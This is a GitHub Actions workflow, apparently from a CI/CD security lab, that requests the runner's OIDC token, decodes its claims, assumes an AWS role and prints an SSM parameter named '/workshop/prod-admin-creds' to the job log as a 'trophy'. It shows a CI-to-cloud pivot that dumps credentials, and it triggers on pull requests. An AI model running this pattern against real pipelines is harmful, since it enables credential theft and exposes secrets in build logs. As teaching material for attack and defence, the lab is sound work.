name: oidc-pivot

on:
  push:
    branches: [main]
  pull_request:

permissions:
  id-token: write
  contents: read

jobs:
  pivot:
    runs-on: ubuntu-latest
    steps:
      - name: Show OIDC claims (sub/aud only, not secrets)
        run: |
          IDTOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
            | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "$IDTOKEN" | python3 -c '
          import sys,base64,json
          t=sys.stdin.read().strip().split(".")[1]; t+="="*(-len(t)%4)
          d=json.loads(base64.urlsafe_b64decode(t))
          print("SUB="+str(d.get("sub")))
          print("AUD="+str(d.get("aud")))'

      - name: Assume AWS role via GitHub OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::768242378223:role/github-cicd-lab
          aws-region: us-east-1

      - name: Read the sandbox trophy
        run: |
          echo "Assumed the lab role via OIDC. Reading the sandbox secret:"
          aws ssm get-parameter --name /workshop/prod-admin-creds --query 'Parameter.Value' --output text
